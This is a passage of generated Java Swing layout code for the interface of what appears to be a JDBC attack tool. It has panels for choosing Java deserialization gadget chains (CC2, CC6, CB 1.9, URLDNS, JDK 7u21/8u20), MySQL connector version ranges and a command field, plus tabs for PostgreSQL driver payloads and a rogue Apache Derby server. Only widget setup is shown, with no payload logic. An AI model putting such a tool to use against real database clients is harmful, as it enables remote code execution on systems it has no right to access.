        payloadPanel.add(copyButton, new GridConstraints(9, 14, 1, 3, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cmdFileLabel = new JLabel();
        cmdFileLabel.setText("Cmd / File");
        payloadPanel.add(cmdFileLabel, new GridConstraints(8, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        cmdFileText = new JTextField();
        cmdFileText.setText("");
        payloadPanel.add(cmdFileText, new GridConstraints(8, 3, 1, 11, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        generatePayloadButton = new JButton();
        generatePayloadButton.setText("Generate Normal");
        payloadPanel.add(generatePayloadButton, new GridConstraints(8, 15, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        modeLabel = new JLabel();
        modeLabel.setText("Mode");
        payloadPanel.add(modeLabel, new GridConstraints(3, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        deserButton = new JRadioButton();
        deserButton.setBackground(new Color(-1120293));
        deserButton.setText("Deserialization");
        payloadPanel.add(deserButton, new GridConstraints(3, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        fileReadButton = new JRadioButton();
        fileReadButton.setBackground(new Color(-1120293));
        fileReadButton.setText("File Read");
        payloadPanel.add(fileReadButton, new GridConstraints(3, 4, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        gadgetPanel = new JPanel();
        gadgetPanel.setLayout(new GridLayoutManager(4, 4, new Insets(0, 0, 0, 0), -1, -1));
        gadgetPanel.setBackground(new Color(-1120293));
        payloadPanel.add(gadgetPanel, new GridConstraints(1, 0, 2, 17, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        gadgetPanel.setBorder(BorderFactory.createTitledBorder(null, "Gadget", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        jdk7Button = new JRadioButton();
        jdk7Button.setBackground(new Color(-1120293));
        jdk7Button.setText("JDK 7u21");
        gadgetPanel.add(jdk7Button, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        jdk8Button = new JRadioButton();
        jdk8Button.setBackground(new Color(-1120293));
        jdk8Button.setText("JDK 8u20");
        gadgetPanel.add(jdk8Button, new GridConstraints(0, 2, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cc44Button = new JRadioButton();
        cc44Button.setBackground(new Color(-1120293));
        cc44Button.setText("CC 4.4.0 (CC2)");
        gadgetPanel.add(cc44Button, new GridConstraints(1, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        urldnsButton = new JRadioButton();
        urldnsButton.setBackground(new Color(-1120293));
        urldnsButton.setText("URLDNS");
        gadgetPanel.add(urldnsButton, new GridConstraints(1, 2, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cbButton = new JRadioButton();
        cbButton.setBackground(new Color(-1120293));
        cbButton.setText("CB 1.9");
        gadgetPanel.add(cbButton, new GridConstraints(0, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cc31Button = new JRadioButton();
        cc31Button.setBackground(new Color(-1120293));
        cc31Button.setText("CC 3.1 (CC6)");
        gadgetPanel.add(cc31Button, new GridConstraints(1, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        scroll = new JScrollPane();
        gadgetPanel.add(scroll, new GridConstraints(2, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(-1, 100), new Dimension(-1, 100), new Dimension(-1, 100), 0, false));
        gadgetArea = new JTextArea();
        gadgetArea.setText("");
        scroll.setViewportView(gadgetArea);
        customPanel = new JPanel();
        customPanel.setLayout(new GridLayoutManager(1, 3, new Insets(0, 0, 0, 0), -1, -1));
        customPanel.setBackground(new Color(-1120294));
        gadgetPanel.add(customPanel, new GridConstraints(3, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        applyButton = new JButton();
        applyButton.setText("Apply Gadget Data");
        customPanel.add(applyButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        cleanButton = new JButton();
        cleanButton.setText("Clean");
        customPanel.add(cleanButton, new GridConstraints(0, 2, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        useCustomGadgetBase64RadioButton = new JRadioButton();
        useCustomGadgetBase64RadioButton.setBackground(new Color(-1120294));
        useCustomGadgetBase64RadioButton.setEnabled(false);
        useCustomGadgetBase64RadioButton.setText("use custom gadget (base64 data)");
        customPanel.add(useCustomGadgetBase64RadioButton, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        typeLabel = new JLabel();
        typeLabel.setText("Type");
        payloadPanel.add(typeLabel, new GridConstraints(4, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        detectCustomCollationsRadioButton = new JRadioButton();
        detectCustomCollationsRadioButton.setBackground(new Color(-1120293));
        detectCustomCollationsRadioButton.setText("detectCustomCollations");
        payloadPanel.add(detectCustomCollationsRadioButton, new GridConstraints(4, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        serverStatusDiffInterceptorRadioButton = new JRadioButton();
        serverStatusDiffInterceptorRadioButton.setBackground(new Color(-1120293));
        serverStatusDiffInterceptorRadioButton.setText("ServerStatusDiffInterceptor");
        payloadPanel.add(serverStatusDiffInterceptorRadioButton, new GridConstraints(4, 4, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        jdbcVersionPanel = new JPanel();
        jdbcVersionPanel.setLayout(new GridLayoutManager(1, 5, new Insets(0, 0, 0, 0), -1, -1));
        jdbcVersionPanel.setBackground(new Color(-1120293));
        payloadPanel.add(jdbcVersionPanel, new GridConstraints(5, 0, 3, 17, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        jdbcVersionPanel.setBorder(BorderFactory.createTitledBorder(null, "JDBC Version", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        v5105118RadioButton = new JRadioButton();
        v5105118RadioButton.setBackground(new Color(-1120293));
        v5105118RadioButton.setText("5.1.0-5.1.18");
        jdbcVersionPanel.add(v5105118RadioButton, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        v51195128RadioButton = new JRadioButton();
        v51195128RadioButton.setBackground(new Color(-1120293));
        v51195128RadioButton.setText("5.1.19-5.1.28");
        jdbcVersionPanel.add(v51195128RadioButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        v602606RadioButton = new JRadioButton();
        v602606RadioButton.setBackground(new Color(-1120293));
        v602606RadioButton.setText("6.0.2-6.0.6");
        jdbcVersionPanel.add(v602606RadioButton, new GridConstraints(0, 3, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        v8078020RadioButton = new JRadioButton();
        v8078020RadioButton.setBackground(new Color(-1120293));
        v8078020RadioButton.setText("8.0.7-8.0.20");
        jdbcVersionPanel.add(v8078020RadioButton, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        v51295148RadioButton = new JRadioButton();
        v51295148RadioButton.setBackground(new Color(-1120293));
        v51295148RadioButton.setText("5.1.29-5.1.48");
        jdbcVersionPanel.add(v51295148RadioButton, new GridConstraints(0, 2, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        generateBase64Button = new JButton();
        generateBase64Button.setText("Generate Base64");
        payloadPanel.add(generateBase64Button, new GridConstraints(8, 14, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        pgsqlPanel = new JPanel();
        pgsqlPanel.setLayout(new GridLayoutManager(4, 2, new Insets(0, 0, 0, 0), -1, -1));
        pgsqlPanel.setBackground(new Color(-1120294));
        tabbedPanel.addTab("PostgreSQL", pgsqlPanel);
        pgBindPane = new JPanel();
        pgBindPane.setLayout(new GridLayoutManager(2, 5, new Insets(10, 10, 10, 10), -1, -1));
        pgBindPane.setBackground(new Color(-1120293));
        pgsqlPanel.add(pgBindPane, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_NORTH, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, new Dimension(-1, 100), 0, false));
        pgBindPane.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        pgIpText = new JTextField();
        pgBindPane.add(pgIpText, new GridConstraints(0, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        pgIpLabel = new JLabel();
        pgIpLabel.setText("Bind IP");
        pgBindPane.add(pgIpLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        pgPortLabel = new JLabel();
        pgPortLabel.setText("Bind Port");
        pgBindPane.add(pgPortLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        pgPortText = new JTextField();
        pgBindPane.add(pgPortText, new GridConstraints(1, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        pgRanPortBtn = new JButton();
        pgRanPortBtn.setText("Random Free Port");
        pgBindPane.add(pgRanPortBtn, new GridConstraints(1, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        pgUse0Btn = new JButton();
        pgUse0Btn.setText("USE 0.0.0.0");
        pgBindPane.add(pgUse0Btn, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        pgStatusPane = new JPanel();
        pgStatusPane.setLayout(new GridLayoutManager(2, 4, new Insets(10, 10, 10, 10), -1, -1));
        pgStatusPane.setBackground(new Color(-1120293));
        pgsqlPanel.add(pgStatusPane, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_NORTH, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, new Dimension(-1, 100), 0, false));
        pgStatusPane.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        pgStatusLabel = new JLabel();
        pgStatusLabel.setText("Status: ");
        pgStatusPane.add(pgStatusLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        psStartStop = new JLabel();
        psStartStop.setText("STOP");
        pgStatusPane.add(psStartStop, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        pgStartPane = new JPanel();
        pgStartPane.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
        pgStartPane.setBackground(new Color(-1120293));
        pgStatusPane.add(pgStartPane, new GridConstraints(1, 0, 1, 4, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        pgStartServerBtn = new JButton();
        pgStartServerBtn.setText("Start Server");
        pgStartPane.add(pgStartServerBtn, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
        pgStopServerBtn = new JButton();
        pgStopServerBtn.setText("Stop Server");
        pgStartPane.add(pgStopServerBtn, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, new Dimension(150, -1), new Dimension(150, -1), new Dimension(150, -1), 0, false));
        final Spacer spacer1 = new Spacer();
        pgsqlPanel.add(spacer1, new GridConstraints(3, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_VERTICAL, 1, GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
        configPanel = new JPanel();
        configPanel.setLayout(new GridLayoutManager(2, 2, new Insets(0, 0, 0, 0), -1, -1));
        configPanel.setBackground(new Color(-1120294));
        pgsqlPanel.add(configPanel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        addressLabel = new JLabel();
        addressLabel.setText("Address");
        configPanel.add(addressLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        pgAddrText = new JTextField();
        pgAddrText.setText("");
        configPanel.add(pgAddrText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        pgCmdLabel = new JLabel();
        pgCmdLabel.setText("Command");
        configPanel.add(pgCmdLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        pgCmdText = new JTextField();
        configPanel.add(pgCmdText, new GridConstraints(1, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        winLinuxPanel = new JPanel();
        winLinuxPanel.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
        winLinuxPanel.setBackground(new Color(-1120294));
        pgsqlPanel.add(winLinuxPanel, new GridConstraints(1, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        winLinuxPanel.setBorder(BorderFactory.createTitledBorder(null, "Target OS", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        windowsRadioButton = new JRadioButton();
        windowsRadioButton.setBackground(new Color(-1120294));
        windowsRadioButton.setText("Windows");
        winLinuxPanel.add(windowsRadioButton, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        linuxRadioButton = new JRadioButton();
        linuxRadioButton.setBackground(new Color(-1120294));
        linuxRadioButton.setText("Linux");
        winLinuxPanel.add(linuxRadioButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        outputPanel = new JPanel();
        outputPanel.setLayout(new GridLayoutManager(2, 3, new Insets(0, 0, 0, 10), -1, -1));
        outputPanel.setBackground(new Color(-1120294));
        pgsqlPanel.add(outputPanel, new GridConstraints(2, 0, 1, 2, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        pgUrlLabel = new JLabel();
        pgUrlLabel.setText("URL");
        outputPanel.add(pgUrlLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        generatePostgreSQLDriverPayloadButton = new JButton();
        generatePostgreSQLDriverPayloadButton.setText("Generate PostgreSQL Driver Payload");
        outputPanel.add(generatePostgreSQLDriverPayloadButton, new GridConstraints(0, 2, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        pgPayloadScroll = new JScrollPane();
        outputPanel.add(pgPayloadScroll, new GridConstraints(1, 0, 1, 3, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_WANT_GROW, new Dimension(-1, 250), new Dimension(-1, 250), new Dimension(-1, 250), 1, false));
        pgPayloadArea = new JTextArea();
        pgPayloadArea.setLineWrap(true);
        pgPayloadScroll.setViewportView(pgPayloadArea);
        pgUrlText = new JTextField();
        pgUrlText.setEditable(false);
        outputPanel.add(pgUrlText, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        derbyPanel = new JPanel();
        derbyPanel.setLayout(new GridLayoutManager(5, 2, new Insets(0, 0, 0, 0), -1, -1));
        derbyPanel.setBackground(new Color(-1120294));
        tabbedPanel.addTab("Apache Derby", derbyPanel);
        dbPanel = new JPanel();
        dbPanel.setLayout(new GridLayoutManager(2, 5, new Insets(10, 10, 10, 10), -1, -1));
        dbPanel.setBackground(new Color(-1120293));
        derbyPanel.add(dbPanel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_NORTH, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, new Dimension(-1, 100), 0, false));
        dbPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        dbIpText = new JTextField();
        dbPanel.add(dbIpText, new GridConstraints(0, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        dbIpLabel = new JLabel();
        dbIpLabel.setText("Bind IP");
        dbPanel.add(dbIpLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        dbPortLabel = new JLabel();
        dbPortLabel.setText("Bind Port");
        dbPanel.add(dbPortLabel, new GridConstraints(1, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        dbPortText = new JTextField();
        dbPanel.add(dbPortText, new GridConstraints(1, 1, 1, 3, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, GridConstraints.SIZEPOLICY_FIXED, null, new Dimension(150, -1), null, 0, false));
        dbRanPortBtn = new JButton();
        dbRanPortBtn.setText("Random Free Port");
        dbPanel.add(dbRanPortBtn, new GridConstraints(1, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        dbUse0Btn = new JButton();
        dbUse0Btn.setText("USE 0.0.0.0");
        dbPanel.add(dbUse0Btn, new GridConstraints(0, 4, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        final Spacer spacer2 = new Spacer();
        derbyPanel.add(spacer2, new GridConstraints(4, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_VERTICAL, 1, GridConstraints.SIZEPOLICY_WANT_GROW, null, null, null, 0, false));
        dbStatusPanel = new JPanel();
        dbStatusPanel.setLayout(new GridLayoutManager(2, 4, new Insets(10, 10, 10, 10), -1, -1));
        dbStatusPanel.setBackground(new Color(-1120293));
        derbyPanel.add(dbStatusPanel, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_NORTH, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, new Dimension(-1, 100), 0, false));
        dbStatusPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEmptyBorder(), "", TitledBorder.DEFAULT_JUSTIFICATION, TitledBorder.DEFAULT_POSITION, null, null));
        dbStatusLabel = new JLabel();
        dbStatusLabel.setText("Status: ");
        dbStatusPanel.add(dbStatusLabel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 1, false));
        dbStartStop = new JLabel();
        dbStartStop.setText("STOP");
        dbStatusPanel.add(dbStartStop, new GridConstraints(0, 2, 1, 2, GridConstraints.ANCHOR_WEST, GridConstraints.FILL_NONE, GridConstraints.SIZEPOLICY_FIXED, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        dbOpPanel = new JPanel();
        dbOpPanel.setLayout(new GridLayoutManager(1, 2, new Insets(0, 0, 0, 0), -1, -1));
